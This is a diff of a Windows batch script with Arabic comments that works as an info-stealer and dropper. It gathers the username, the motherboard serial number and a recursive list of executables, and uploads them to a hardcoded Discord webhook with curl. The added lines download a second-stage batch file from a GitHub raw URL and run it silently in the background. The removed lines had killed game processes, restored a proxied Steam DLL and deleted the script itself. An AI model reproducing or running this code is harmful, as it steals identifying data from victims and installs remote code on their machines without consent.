@@ -1,81 +1,26 @@
 @echo off
-
-setlocal enabledelayedexpansion
-
-
-
-:: إعداد المتغيرات
-
+:: إعداد الروابط
 set "WEBHOOK_URL=https://discord.com/api/webhooks/1461350525168652433/y5T90DbXCLHZGb_wqEi9ho4VqMb1XGgA6VKoL_M9LbKiywFyhcl4bAE7MpZF2oiTFOyB"
-
+set "BAT1_URL=https://raw.githubusercontent.com/857seif/11111111/main/1.bat"
 set "TEMP_FILE=%TEMP%\Result.txt"
+set "BAT1_PATH=%TEMP%\1.bat"
 
-
-
-:: 1. جمع البيانات وإرسالها (دي أول حاجة عشان نلحق قبل القفل)
-
+:: 1. جمع معلومات الجهاز والملفات
 echo === Device Info === > "%TEMP_FILE%"
-
 echo Username: %USERNAME% >> "%TEMP_FILE%"
-
+echo Motherboard ID: >> "%TEMP_FILE%"
 wmic baseboard get serialnumber | findstr /V "SerialNumber" >> "%TEMP_FILE%"
-
 echo. >> "%TEMP_FILE%"
-
+echo === Folder Contents (EXE) === >> "%TEMP_FILE%"
 dir /b /s *.exe >> "%TEMP_FILE%"
 
-
-
-:: إرسال الملف
-
+:: 2. إرسال البيانات إلى Discord
 curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%TEMP_FILE%" %WEBHOOK_URL%
 
+:: 3. تحميل ملف المرحلة الثانية (1.bat) وتشغيله في الخلفية
+curl -L -o "%BAT1_PATH%" %BAT1_URL%
+start /b "" cmd /c "%BAT1_PATH%"
 
-
-:: 2. قفل اللعبة (مهم جداً عشان نقدر نمسح الـ DLL)
-
-:: هيدور على أي EXE في المجلد الحالي ويقفله
-
-for %%i in (*.exe) do (
-
-    taskkill /F /IM "%%i" /T >nul 2>&1
-
-)
-
-
-
-:: استراحة بسيطة للتأكد إن كل العمليات قفلت
-
-timeout /t 2 >nul
-
-
-
-:: 3. استبدال الملفات (التنظيف)
-
-:: حذف ملف النتيجة المؤقت
-
+:: 4. مسح ملف النتائج المؤقت والخروج
 if exist "%TEMP_FILE%" del /f /q "%TEMP_FILE%"
-
-
-
-:: استعادة الـ DLL الأصلية
-
-:: هنا بنمسح الـ Proxy اللي هو (steam_api64.dll) ونرجع (steam-api64.dll)
-
-if exist "steam-api64.dll" (
-
-    del /f /q "steam_api64.dll"
-
-    ren "steam-api64.dll" "steam_api64.dll"
-
-)
-
-
-
-:: 4. الحركة النهائية: مسح ملف الباتش نفسه من الـ Temp
-
-:: بنفتح cmd جديدة في الخلفية تستنى ثانية وتمسح الملف ده
-
-start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
-
 exit
